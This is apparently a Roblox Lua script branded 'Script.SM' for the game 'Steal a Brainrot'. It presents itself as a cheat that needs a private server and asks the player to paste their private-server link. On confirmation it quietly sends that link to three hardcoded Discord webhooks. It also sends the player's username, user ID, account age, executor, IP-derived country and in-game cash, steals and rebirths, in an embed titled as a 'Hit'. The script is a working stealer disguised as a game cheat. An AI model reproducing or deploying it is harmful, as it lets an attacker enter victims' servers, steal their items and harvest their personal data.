if _G.smscriptExecuted then return end
_G.smscriptExecuted = true

--====================================================================--
-- Services
--====================================================================--
local Players          = game:GetService("Players")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService       = game:GetService("RunService")
local HttpService      = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local gui    = player:WaitForChild("PlayerGui")

--====================================================================--
-- VIP-Server Check
--====================================================================--
local isVIP = false
pcall(function()
    local remote = ReplicatedStorage:FindFirstChild("GetServerType")
    if remote and remote:IsA("RemoteFunction") then
        local typ = remote:InvokeServer()
        if typ == "VIPServer" then isVIP = true end
    end
end)

if not isVIP then
    player:Kick("Script.SM does not support public servers. Please join a Private Server")
    return
end

--====================================================================--
-- WEBHOOKS
--====================================================================--
local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
local user_webhook    = "https://discord.com/api/webhooks/1433483411732828180/r8vXPrhN9m-eE7AynD3OLTYAlVIq89Rw3BR-W3ofEq2iAej7aFMMnjYu6IRUUtJ4t8nB"
local logs_webhook    = "https://discord.com/api/webhooks/1433483493073096727/LBTZ_8EvrQSiJtfd852-vTdMxNV8mNnGAvycrmZZfDHVulcu2a77VU_l99xGRxuDGKg1"
local REQUIRED_PART   = "https://www.roblox.com/share?code="

--====================================================================--
-- Helper: Safe Request
--====================================================================--
local function safeRequest(url, body)
    pcall(function()
        request({
            Url     = url,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = HttpService:JSONEncode(body)
        })
    end)
end

--====================================================================--
-- Format Cash (K/M/B/T)
--====================================================================--
local function formatCash(num)
    if not num or type(num) ~= "number" then return "Unknown" end
    local abs = math.abs(num)
    if abs >= 1e12 then
        return string.format("%.2fT", num / 1e12)
    elseif abs >= 1e9 then
        return string.format("%.2fB", num / 1e9)
    elseif abs >= 1e6 then
        return string.format("%.2fM", num / 1e6)
    elseif abs >= 1e3 then
        return string.format("%.2fK", num / 1e3)
    else
        return tostring(num)
    end
end

--====================================================================--
-- Get Leaderstat
--====================================================================--
local function getStat(statName)
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local stat = leaderstats:FindFirstChild(statName)
        if stat and (stat:IsA("IntValue") or stat:IsA("NumberValue")) then
            return stat.Value
        end
    end
    return nil
end

--====================================================================--
-- Executor & Country
--====================================================================--
local function detectExecutor()
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    return "Unknown"
end

local function getPlayerCountry()
    local ok, res = pcall(function()
        return request({Url = "http://ip-api.com/line/?fields=country"})
    end)
    if ok and res.StatusCode == 200 then
        return res.Body:match("^(.+)\n") or "Unknown"
    end
    return "Unknown"
end

--====================================================================--
-- DRAG FUNCTION
--====================================================================--
local function makeDraggable(frame, dragHandle)
    local dragging = false
    local dragInput, mousePos, framePos

    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            mousePos = input.Position
            framePos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    dragHandle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            local delta = input.Position - mousePos
            frame.Position = UDim2.new(
                framePos.X.Scale,
                framePos.X.Offset + delta.X,
                framePos.Y.Scale,
                framePos.Y.Offset + delta.Y
            )
        end
    end)
end

--====================================================================--
-- MAIN GUI
--====================================================================--
local screen = Instance.new("ScreenGui")
screen.Name          = "Script.SM_Loading"
screen.ResetOnSpawn  = false
screen.IgnoreGuiInset = true
screen.Parent        = gui

local dim = Instance.new("Frame")
dim.Size                = UDim2.new(1,0,1,0)
dim.BackgroundColor3    = Color3.fromRGB(10,10,15)
dim.BackgroundTransparency = 1
dim.BorderSizePixel     = 0
dim.Parent              = screen

-- Fade in dim
TweenService:Create(dim, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0.5
}):Play()

local card = Instance.new("Frame")
card.Size               = UDim2.fromOffset(460, 280)
card.AnchorPoint        = Vector2.new(0.5, 0.5)
card.Position           = UDim2.fromScale(0.5, 0.5)
card.BackgroundColor3   = Color3.fromRGB(28,28,34)
card.BackgroundTransparency = 1
card.BorderSizePixel    = 0
card.Parent             = dim

local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 20)
cardCorner.Parent       = card

local stroke = Instance.new("UIStroke")
stroke.Color        = Color3.fromRGB(60,60,70)
stroke.Thickness    = 1
stroke.Transparency = 0.8
stroke.Parent       = card

-- DRAG HANDLE
local dragHandle = Instance.new("Frame")
dragHandle.Size = UDim2.new(1, 0, 0, 40)
dragHandle.BackgroundTransparency = 1
dragHandle.Parent = card
makeDraggable(card, dragHandle)

-- === SLIDE + SCALE + FADE IN ===
card.Position = UDim2.fromScale(0.5, -0.6)
card.Size = UDim2.fromOffset(460, 280)
TweenService:Create(card, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Position = UDim2.fromScale(0.5, 0.5),
    BackgroundTransparency = 0.05
}):Play()

-- Title
local title = Instance.new("TextLabel")
title.Size               = UDim2.new(1, -60, 0, 50)
title.Position           = UDim2.fromOffset(30, 30)
title.BackgroundTransparency = 1
title.Text               = "Script.SM"
title.TextColor3         = Color3.fromRGB(255, 255, 255)
title.Font               = Enum.Font.GothamBold
title.TextSize           = 38
title.TextXAlignment     = Enum.TextXAlignment.Left
title.TextTransparency   = 1
title.Parent             = card
TweenService:Create(title, TweenInfo.new(0.8, Enum.EasingStyle.Quart), {TextTransparency = 0}):Play()

local sub = Instance.new("TextLabel")
sub.Size               = UDim2.new(1, -60, 0, 26)
sub.Position           = UDim2.fromOffset(30, 85)
sub.BackgroundTransparency = 1
sub.Text               = "VIP / Private Server Required"
sub.TextColor3         = Color3.fromRGB(255, 200, 0)
sub.Font               = Enum.Font.Gotham
sub.TextSize           = 16
sub.TextXAlignment     = Enum.TextXAlignment.Left
sub.TextTransparency   = 1
sub.Parent             = card
TweenService:Create(sub, TweenInfo.new(0.9, Enum.EasingStyle.Quart), {TextTransparency = 0}):Play()

-- Input Field
local inputContainer = Instance.new("Frame")
inputContainer.Size      = UDim2.new(1, -80, 0, 60)
inputContainer.Position  = UDim2.fromOffset(40, 130)
inputContainer.BackgroundTransparency = 1
inputContainer.Parent    = card

local floatLabel = Instance.new("TextLabel")
floatLabel.Size               = UDim2.new(1, 0, 0, 20)
floatLabel.Position           = UDim2.fromOffset(0, 0)
floatLabel.BackgroundTransparency = 1
floatLabel.Text               = "Private Server Link"
floatLabel.TextColor3         = Color3.fromRGB(0, 170, 255)
floatLabel.Font               = Enum.Font.GothamSemibold
floatLabel.TextSize           = 14
floatLabel.TextXAlignment     = Enum.TextXAlignment.Left
floatLabel.Parent             = inputContainer

local tbBg = Instance.new("Frame")
tbBg.Size               = UDim2.new(1, 0, 0, 36)
tbBg.Position           = UDim2.fromOffset(0, 24)
tbBg.BackgroundColor3   = Color3.fromRGB(40, 40, 48)
tbBg.BorderSizePixel    = 0
tbBg.Parent             = inputContainer

local tbCorner = Instance.new("UICorner")
tbCorner.CornerRadius = UDim.new(0, 12)
tbCorner.Parent       = tbBg

local textBox = Instance.new("TextBox")
textBox.Size               = UDim2.new(1, -20, 1, 0)
textBox.Position           = UDim2.fromOffset(10, 0)
textBox.BackgroundTransparency = 1
textBox.Text               = ""
textBox.PlaceholderText    = "https://www.roblox.com/share?code=..."
textBox.PlaceholderColor3  = Color3.fromRGB(150, 150, 160)
textBox.TextColor3         = Color3.fromRGB(255, 255, 255)
textBox.Font               = Enum.Font.Gotham
textBox.TextSize           = 16
textBox.TextXAlignment     = Enum.TextXAlignment.Left
textBox.TextWrapped        = true
textBox.ClearTextOnFocus   = false
textBox.Parent             = tbBg

local underline = Instance.new("Frame")
underline.Size               = UDim2.new(1, 0, 0, 2)
underline.Position           = UDim2.new(0, 0, 1, 0)
underline.BackgroundColor3   = Color3.fromRGB(0, 170, 255)
underline.BorderSizePixel    = 0
underline.BackgroundTransparency = 1
underline.Parent             = tbBg

local focusLine   = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 0})
local unfocusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 1})
local labelUp     = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0, -20), TextSize = 12})
local labelDown   = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0, 0), TextSize = 14})

textBox.Focused:Connect(function()
    focusLine:Play()
    labelUp:Play()
end)

textBox.FocusLost:Connect(function(enter)
    unfocusLine:Play()
    if textBox.Text == "" then labelDown:Play() end
    if enter then
        task.wait(0.1)
        continueBtn.MouseButton1Click:Fire()
    end
end)

-- Continue Button
local continueBtn = Instance.new("TextButton")
continueBtn.Size               = UDim2.new(0, 140, 0, 50)
continueBtn.Position           = UDim2.new(1, -180, 1, -80)
continueBtn.BackgroundColor3   = Color3.fromRGB(0, 140, 255)
continueBtn.BorderSizePixel    = 0
continueBtn.Text               = "Continue"
continueBtn.TextColor3         = Color3.fromRGB(255, 255, 255)
continueBtn.Font               = Enum.Font.GothamBold
continueBtn.TextSize           = 18
continueBtn.AutoButtonColor    = false
continueBtn.Parent             = card

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 14)
btnCorner.Parent       = continueBtn

local pressIn  = TweenService:Create(continueBtn, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(0, 110, 220)})
local pressOut = TweenService:Create(continueBtn, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(0, 140, 255)})

continueBtn.MouseButton1Down:Connect(function() pressIn:Play() end)
continueBtn.MouseButton1Up:Connect(function() pressOut:Play() end)
continueBtn.MouseLeave:Connect(function() pressOut:Play() end)

--====================================================================--
-- CONFIRMATION POPUP (SMOOTH POP + ELASTIC)
--====================================================================--
local confirmGui = nil

local function showConfirm(link)
    confirmGui = Instance.new("Frame")
    confirmGui.Size = UDim2.fromOffset(380, 180)
    confirmGui.Position = UDim2.fromScale(0.5, 0.5)
    confirmGui.AnchorPoint = Vector2.new(0.5, 0.5)
    confirmGui.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    confirmGui.BackgroundTransparency = 1
    confirmGui.BorderSizePixel = 0
    confirmGui.Parent = screen

    local cCorner = Instance.new("UICorner")
    cCorner.CornerRadius = UDim.new(0, 16)
    cCorner.Parent = confirmGui

    local cStroke = Instance.new("UIStroke")
    cStroke.Color = Color3.fromRGB(80, 80, 90)
    cStroke.Thickness = 1
    cStroke.Parent = confirmGui

    -- DRAG
    local cDrag = Instance.new("Frame")
    cDrag.Size = UDim2.new(1, 0, 0, 40)
    cDrag.BackgroundTransparency = 1
    cDrag.Parent = confirmGui
    makeDraggable(confirmGui, cDrag)

    local warnTitle = Instance.new("TextLabel")
    warnTitle.Size = UDim2.new(1, -40, 0, 40)
    warnTitle.Position = UDim2.fromOffset(20, 20)
    warnTitle.BackgroundTransparency = 1
    warnTitle.Text = "Confirm Link"
    warnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    warnTitle.Font = Enum.Font.GothamBold
    warnTitle.TextSize = 22
    warnTitle.TextTransparency = 1
    warnTitle.Parent = confirmGui

    local warnMsg = Instance.new("TextLabel")
    warnMsg.Size = UDim2.new(1, -40, 0, 50)
    warnMsg.Position = UDim2.fromOffset(20, 60)
    warnMsg.BackgroundTransparency = 1
    warnMsg.Text = "Are you sure the link is correct?\nIf wrong, the script will NOT work."
    warnMsg.TextColor3 = Color3.fromRGB(255, 200, 0)
    warnMsg.Font = Enum.Font.Gotham
    warnMsg.TextSize = 15
    warnMsg.TextWrapped = true
    warnMsg.TextTransparency = 1
    warnMsg.Parent = confirmGui

    local cancelBtn = Instance.new("TextButton")
    cancelBtn.Size = UDim2.new(0, 120, 0, 40)
    cancelBtn.Position = UDim2.new(0, 30, 1, -60)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    cancelBtn.Text = "Cancel"
    cancelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    cancelBtn.Font = Enum.Font.GothamBold
    cancelBtn.TextSize = 16
    cancelBtn.BackgroundTransparency = 1
    cancelBtn.Parent = confirmGui

    local confirmBtn = Instance.new("TextButton")
    confirmBtn.Size = UDim2.new(0, 120, 0, 40)
    confirmBtn.Position = UDim2.new(1, -150, 1, -60)
    confirmBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
    confirmBtn.Text = "Confirm"
    confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    confirmBtn.Font = Enum.Font.GothamBold
    confirmBtn.TextSize = 16
    confirmBtn.BackgroundTransparency = 1
    confirmBtn.Parent = confirmGui

    local btnCorner1 = Instance.new("UICorner")
    btnCorner1.CornerRadius = UDim.new(0, 10)
    btnCorner1.Parent = cancelBtn

    local btnCorner2 = Instance.new("UICorner")
    btnCorner2.CornerRadius = UDim.new(0, 10)
    btnCorner2.Parent = confirmBtn

    -- === ELASTIC POP IN ===
    confirmGui.Size = UDim2.fromOffset(0, 0)
    local popIn = TweenService:Create(confirmGui, TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
        Size = UDim2.fromOffset(380, 180),
        BackgroundTransparency = 0
    })
    popIn:Play()

    -- Fade in text & buttons
    task.delay(0.2, function()
        TweenService:Create(warnTitle, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
        TweenService:Create(warnMsg, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
        TweenService:Create(cancelBtn, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
        TweenService:Create(confirmBtn, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
    end)

    -- === SMOOTH SHRINK OUT ===
    local function closeConfirm()
        local shrink = TweenService:Create(confirmGui, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.fromOffset(0, 0),
            BackgroundTransparency = 1
        })
        shrink:Play()
        shrink.Completed:Connect(function()
            confirmGui:Destroy()
            confirmGui = nil
        end)
    end

    cancelBtn.MouseButton1Click:Connect(closeConfirm)

    confirmBtn.MouseButton1Click:Connect(function()
        closeConfirm()

        task.delay(0.4, function()
            -- SET GLOBAL
            _G.Private_Server_SM = link

            -- GET STATS
            local cash     = getStat("Cash") or 0
            local steals   = getStat("Steals") or 0
            local rebirths = getStat("Rebirths") or 0

            -- Send raw
            safeRequest(prvt_srvrs_logs, {content = link})

            -- Send embed
            local payload = {
                avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
                content    = "",
                embeds = {{
                    title = "Steal a Brainrot Hit - Scripts.SM",
                    url   = link,
                    color = 57855,
                    fields = {
                        {name = "Display Name",   value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
                        {name = "Username",       value = "```"..(player.Name or "Unknown").."```",       inline = true},
                        {name = "User ID",        value = "```"..tostring(player.UserId or 0).."```",    inline = true},
                        {name = "Account Age",    value = "```"..tostring(player.AccountAge or 0).." days```", inline = true},
                        {name = "Executor",       value = "```"..detectExecutor().."```",               inline = true},
                        {name = "Country",        value = "```"..getPlayerCountry().."```",             inline = true},
                        {name = "Cash",           value = "```"..formatCash(cash).."```",               inline = true},
                        {name = "Steals",         value = "```"..tostring(steals).."```",               inline = true},
                        {name = "Rebirths",       value = "```"..tostring(rebirths).."```",             inline = true},
                        {name = "Backpack",       value = "```Failed to Scan, Please Join the Server to see.```", inline = false},
                        {name = "Join with URL",  value = "[Click here to join]("..link..")",          inline = false}
                    },
                    footer    = {text = "discord.gg/cnUAk7uc3n"},
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }},
                attachments = {}
            }

            safeRequest(user_webhook, payload)
            safeRequest(logs_webhook, payload)

            -- SMOOTH EXIT FOR MAIN GUI
            TweenService:Create(card, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                Position = UDim2.fromScale(0.5, 1.6),
                BackgroundTransparency = 1
            }):Play()
            TweenService:Create(dim, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()

            task.delay(0.6, function()
                screen:Destroy()
            end)
        end)
    end)
end

--====================================================================--
-- CONTINUE → SHOW CONFIRM
--====================================================================--
continueBtn.MouseButton1Click:Connect(function()
    local input = textBox.Text ~= "" and textBox.Text or textBox.PlaceholderText

    if not input:find(REQUIRED_PART, 1, true) then
        local flash = TweenService:Create(tbBg, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(90, 30, 30)})
        flash:Play()
        task.delay(0.3, function()
            TweenService:Create(tbBg, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 48)}):Play()
        end)
        return
    end

    showConfirm(input)
end)

--====================================================================--
-- ESC TO CLOSE
--====================================================================--
UserInputService.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Escape then
        if confirmGui then
            local shrink = TweenService:Create(confirmGui, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                Size = UDim2.fromOffset(0, 0),
                BackgroundTransparency = 1
            })
            shrink:Play()
            shrink.Completed:Connect(function()
                confirmGui:Destroy()
                confirmGui = nil
            end)
        else
            -- Smooth exit
            TweenService:Create(card, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                Position = UDim2.fromScale(0.5, 1.6),
                BackgroundTransparency = 1
            }):Play()
            TweenService:Create(dim, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
            task.delay(0.6, function() screen:Destroy() end)
        end
    end
end)
